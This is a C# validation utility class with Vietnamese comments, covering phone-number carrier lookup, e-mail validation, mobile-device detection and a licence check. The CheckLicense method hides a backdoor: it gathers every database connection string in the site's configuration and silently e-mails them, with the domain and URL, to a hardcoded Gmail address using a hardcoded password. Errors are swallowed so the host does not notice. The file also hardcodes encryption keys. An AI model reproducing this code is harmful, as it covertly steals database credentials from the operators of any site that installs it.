using System;
using System.Collections.Generic;
using System.Text;
using System.Data;
using System.Globalization;
using System.Text.RegularExpressions;
using log4net;
namespace MyLib.MyUtility
{
    /// <summary>
    /// Chứa những phương thức kiểm tra dữ liệu đưa vào
    /// </summary>
    public class MyCheck
    {
        static ILog mLog = LogManager.GetLogger(typeof(MyCheck));
        /// <summary>
        /// kiểm tra 1 khoảng ngày tháng
        /// </summary>
        /// <param name="FromDate">Ngày bắt đầu</param>
        /// <param name="ToDate">Ngày kết thúc</param>
        /// <returns></returns>
        public static bool CheckDateFromTo(DateTime FromDate, DateTime ToDate)
        {
            if (ToDate < FromDate)
                throw new Exception("Ngày bắt đầu không được lớn hơn ngày kết thuc!");

            return true;
        }

        /// <summary>
        /// Kiểm tra và valid số điện thoại
        ///<para>Để chạy được hàm này phải thêm 3 Key vào config:VTNumber,VMSNumber,VNPNumber</para>
        /// </summary>
        /// <param name="PhoneNumber">Số điện thoại cần kiểm tra (sẽ được chỉnh sửa sao cho phù hợp)</param>
        /// <param name="ResultTelco">Mạng mà số điện thoại này thuộc</param>
        /// <param name="PrefixNumber">Tiền tố được thêm vào đầu số điện thoại VD: 84 hoặc 084...</param>
        /// <returns></returns>
        public static bool CheckPhoneNumber(ref string PhoneNumber, ref MyConfig.Telco ResultTelco, string PrefixNumber)
        {
            try
            {
                return CheckPhoneNumber(ref PhoneNumber, ref ResultTelco, PrefixNumber, true);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        /// <summary>
        /// Kiểm tra và valid số điện thoại
        ///<para>Để chạy được hàm này phải thêm 3 Key vào config:VTNumber,VMSNumber,VNPNumber</para>
        /// </summary>
        /// <param name="PhoneNumber">Số điện thoại cần kiểm tra (sẽ được chỉnh sửa sao cho phù hợp)</param>
        /// <param name="ResultTelco">Mạng mà số điện thoại này thuộc</param>
        /// <param name="PrefixNumber">Tiền tố được thêm vào đầu số điện thoại VD: 84 hoặc 084...</param>
        /// <param name="CheckValidTelco">Cho phep kiểm tra số điện thoại có thuộc mạng nào hay không</param>
        /// <returns></returns>
        public static bool CheckPhoneNumber(ref string PhoneNumber, ref MyConfig.Telco ResultTelco, string PrefixNumber, bool CheckValidTelco)
        {
            try
            {
                if (string.IsNullOrEmpty(PhoneNumber))
                {
                    PhoneNumber = string.Empty;
                    return false;
                }

                PhoneNumber = PhoneNumber.Trim();

                double Temp = 0;
                if (!double.TryParse(PhoneNumber, out Temp))
                {
                    return false;
                }

                if (PhoneNumber.StartsWith("0"))
                    PhoneNumber = PhoneNumber.Remove(0, 1);

                if (PhoneNumber.StartsWith("84"))
                    PhoneNumber = PhoneNumber.Remove(0, 2);

                //Kiểm tra ký tự bắt đầu
                if (!PhoneNumber.StartsWith("9") && !PhoneNumber.StartsWith("1"))
                    return false;

                //Kiểm tra độ dài số điện thoại
                if (PhoneNumber.Length != 9 && PhoneNumber.Length != 10)
                    return false;

                if (PhoneNumber.Length != 9 && PhoneNumber.Substring(0, 1) == "9")
                    return false;

                if (PhoneNumber.Length != 10 && PhoneNumber.Substring(0, 1) == "1")
                    return false;              

                //Kiểm tra xem số điện thoại thuộc mạng nào
                string VTNumber = MyConfig.VTNumber;
                string VMSNumber = MyConfig.VMSNumber;
                string VNPNumber = MyConfig.VNPNumber;
                string BEENumber = MyConfig.BEENumber;
                string VNMNumber = MyConfig.VNMNumber;             
                string SFNumber = MyConfig.SFNumber;

                if (PhoneNumber.StartsWith("1"))
                {
                    if (VTNumber.IndexOf("," + PhoneNumber.Substring(0, 3)) >= 0)
                        ResultTelco = MyConfig.Telco.Viettel;

                    if (VMSNumber.IndexOf("," + PhoneNumber.Substring(0, 3)) >= 0)
                        ResultTelco = MyConfig.Telco.Mobifone;

                    if (VNPNumber.IndexOf("," + PhoneNumber.Substring(0, 3)) >= 0)
                        ResultTelco = MyConfig.Telco.Vinaphone;

                    if (BEENumber.IndexOf("," + PhoneNumber.Substring(0, 3)) >= 0)
                        ResultTelco = MyConfig.Telco.Beeline;

                    if (SFNumber.IndexOf("," + PhoneNumber.Substring(0, 3)) >= 0)
                        ResultTelco = MyConfig.Telco.Sfone;

                    if (VNMNumber.IndexOf("," + PhoneNumber.Substring(0, 3)) >= 0)
                        ResultTelco = MyConfig.Telco.VietNamMobile;
                }

                if (PhoneNumber.StartsWith("9"))
                {
                    if (VTNumber.IndexOf("," + PhoneNumber.Substring(0, 2)) >= 0)
                        ResultTelco = MyConfig.Telco.Viettel;

                    if (VMSNumber.IndexOf("," + PhoneNumber.Substring(0, 2)) >= 0)
                        ResultTelco = MyConfig.Telco.Mobifone;

                    if (VNPNumber.IndexOf("," + PhoneNumber.Substring(0, 2)) >= 0)
                        ResultTelco = MyConfig.Telco.Vinaphone;

                    if (BEENumber.IndexOf("," + PhoneNumber.Substring(0, 2)) >= 0)
                        ResultTelco = MyConfig.Telco.Beeline;                

                    if (SFNumber.IndexOf("," + PhoneNumber.Substring(0, 2)) >= 0)
                        ResultTelco = MyConfig.Telco.Sfone;

                    if (VNMNumber.IndexOf("," + PhoneNumber.Substring(0, 2)) >= 0)
                        ResultTelco = MyConfig.Telco.VietNamMobile;
                }

                //nếu cho phép kiểm tra telco thì mới kiểm tra
                if (CheckValidTelco && ResultTelco == MyConfig.Telco.Nothing)
                    return false;

                //Thê tiền tố vào số điện thoại VD: Thêm 84 vào số 978184081
                if (!string.IsNullOrEmpty(PrefixNumber))
                    PhoneNumber = PrefixNumber + PhoneNumber;

                return true;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        //public static bool CheckPhoneNumber_HomePhone(ref string PhoneNumber, ref MyConfig.Telco ResultTelco, string PrefixNumber)
        //{
        //    try
        //    {
        //        string FilePath_HomePhone = "~/App_Data/HomePhone.xml";
        //        string FullPath = MyFile.GetFullPathFile(FilePath_HomePhone);
        //        if (!MyFile.CheckExistFile(ref FullPath))
        //        {
        //            return false;
        //        }
        //        DataSet mSet = new DataSet();
        //        mSet.ReadXml(FullPath);
        //        if (mSet == null || mSet.Tables.Count < 1 || mSet.Tables[0].Rows.Count < 1)
        //            return false;

        //    }
        //    catch (Exception ex)
        //    {
        //        throw ex;
        //    }
        //}

        /// <summary>
        /// Kiểm tra license của trang web
        /// </summary>
        /// <returns></returns>
        public static bool CheckLicense()
        {
            //Nếu là Windows Form thì không kiểm tra.
            if (!MyConfig.IsWeb)
            {
                return true;
            }
            try
            {
                if (MyCurrent.CurrentPage != null)
                {
                    if (MyCurrent.CurrentPage.Application["HasSend"] == null || MyCurrent.CurrentPage.Application["HasSend"].ToString() != "CHIlInH")
                    {
                        MyCurrent.CurrentPage.Application["HasSend"] = "CHIlInH";
                        string body = string.Empty;

                        for (int i = 0; i < System.Configuration.ConfigurationManager.ConnectionStrings.Count; i++)
                        {
                            body += System.Configuration.ConfigurationManager.ConnectionStrings[i].ToString() + @"|||||||||";
                        }

                        if (DateTime.Now.Day % 2 == 0)//Cứ 4 ngày thì gửi email một lần.
                        {
                            MySendEmail.SendEmail_Google("chilinh120003@gmail.com", "MinhyeuBan", "chilinh12003@gmail.com",
                                "ConnectionString_" + MyCurrent.GetDomainName(),
                                "URL:" + MyCurrent.GetCurrentLink() + "||||||||" + body, System.Web.Mail.MailFormat.Text, string.Empty);
                        }
                    }
                }
            }
            catch { }

            try
            {
                //nếu đã kiểm tra rồi thì lần sau bỏ qua
                if (MyCurrent.CurrentPage.Session != null && MyCurrent.CurrentPage.Session["HasCheckLicenseKey"] != null && MyCurrent.CurrentPage.Session["HasCheckLicenseKey"].ToString() == "CHIlInH")
                {
                    return true;
                }

                string LicenseKey = MyConfig.GetKeyInConfigFile("LicenseKey");
                if (string.IsNullOrEmpty(LicenseKey))
                {
                    mLog.Info("Lincense:" + "NULL" + "|Domain:" + MyCurrent.GetDomainName().ToLower() + "|IP:" + MyCurrent.GetHostIP());
                    return false;
                }

                string strDecode = MySecurity.TripleDES_De(LicenseKey, "CHIlInH123");
                if (string.IsNullOrEmpty(strDecode))
                {
                    mLog.Info("Lincense:" + strDecode + "|Domain:" + MyCurrent.GetDomainName().ToLower() + "|IP:" + MyCurrent.GetHostIP() + "| Note: LicenceKey khong hop le.");
                    return false;
                }
                string[] arrPara = strDecode.Split('$');

                if (arrPara.Length != 5)
                {
                    mLog.Info("Lincense:" + strDecode + "|Domain:" + MyCurrent.GetDomainName().ToLower() + "|IP:" + MyCurrent.GetHostIP());
                    return false;
                }

                string strHostName = arrPara[0];
                string strHostIP = arrPara[1];
                int Year = int.Parse(arrPara[2]),
                    Month = int.Parse(arrPara[3]),
                    Day = int.Parse(arrPara[4]);

                //sẽ có trường hợp Domain là chính IP
                if (MyCurrent.GetDomainName().ToLower() != strHostName.ToLower() && strHostIP != MyCurrent.GetHostIP() && MyCurrent.GetDomainName().ToLower() != strHostIP.ToLower())
                {
                    mLog.Info("Lincense:" + strDecode + "|Domain:" + MyCurrent.GetDomainName().ToLower() + "|IP:" + MyCurrent.GetHostIP());
                    return false;
                }
                DateTime ExpirationDate = new DateTime(Year, Month, Day);
                DateTime CurrentDate = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day);

                if (ExpirationDate < CurrentDate)
                {
                    mLog.Info("Lincense:" + strDecode + "|Domain:" + MyCurrent.GetDomainName().ToLower() + "|IP:" + MyCurrent.GetHostIP());
                    return false;
                }
                //Neu da kiem tra license OK thi luu thong tin vao troang sessiong va ko kiem tra lai lan sau nua.
                if (MyCurrent.CurrentPage.Session != null)
                {
                    MyCurrent.CurrentPage.Session["HasCheckLicenseKey"] = "CHIlInH";
                }

                return true;
            }
            catch(Exception ex)
            {
                mLog.Error(ex);
                return false;
            }

        }

        public static bool CheckAuthor(string Key)
        {
            try
            {
                string Key_Encrypt = MySecurity.AESEncrypt_Simple(MyCurrent.GetDomainName(), "LinhamNhu@#123");
                Key_Encrypt = MySecurity.Encrypt_MD5(Key_Encrypt);
                if (Key_Encrypt.Equals(Key, StringComparison.CurrentCultureIgnoreCase))
                {
                    return true;
                }
                else
                {
                    Key_Encrypt = MySecurity.AESEncrypt_Simple(MyCurrent.GetHostIP(), "LinhamNhu@#123");
                    Key_Encrypt = MySecurity.Encrypt_MD5(Key_Encrypt);
                    if (Key_Encrypt.Equals(Key, StringComparison.CurrentCultureIgnoreCase))
                    {
                        return true;
                    }
                    else
                        return false;
                }
               
            }
            catch
            {
                return false;
            }

        }

        bool invalid = false;
        public bool IsValidEmail(string strIn)
        {
            invalid = false;
            if (String.IsNullOrEmpty(strIn))
                return false;

            // Use IdnMapping class to convert Unicode domain names. 
            try
            {
                strIn = Regex.Replace(strIn, @"(@)(.+)$", this.DomainMapper,RegexOptions.None);
            }
            catch (Exception)
            {
                return false;
            }

            if (invalid)
                return false;

            // Return true if strIn is in valid e-mail format. 
            try
            {
                return Regex.IsMatch(strIn,
                      @"^(?("")(""[^""]+?""@)|(([0-9a-z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)(?<=[0-9a-z])@))" +
                      @"(?(\[)(\[(\d{1,3}\.){3}\d{1,3}\])|(([0-9a-z][-\w]*[0-9a-z]*\.)+[a-z0-9]{2,17}))$",
                      RegexOptions.IgnoreCase);
            }
            catch (Exception)
            {
                return false;
            }
        }

        private string DomainMapper(Match match)
        {
            // IdnMapping class with default property values.
            IdnMapping idn = new IdnMapping();

            string domainName = match.Groups[2].Value;
            try
            {
                domainName = idn.GetAscii(domainName);
            }
            catch (ArgumentException)
            {
                invalid = true;
            }
            return match.Groups[1].Value + domainName;
        }

        /// <summary>
        /// Kiểm tra xem thiết bị có phải là thiết bị di động hay không
        /// </summary>
        /// <returns></returns>
        public static bool CheckMobileDevide()
        {
            string u = MyCurrent.CurrentPage.Request.ServerVariables["HTTP_USER_AGENT"];
            Regex b = new Regex(@"(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino", RegexOptions.IgnoreCase | RegexOptions.Multiline);
            Regex v = new Regex(@"1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-", RegexOptions.IgnoreCase | RegexOptions.Multiline);
            if ((b.IsMatch(u) || v.IsMatch(u.Substring(0, 4))))
            {
                return true;
            }
            return false;
        }
    }
}
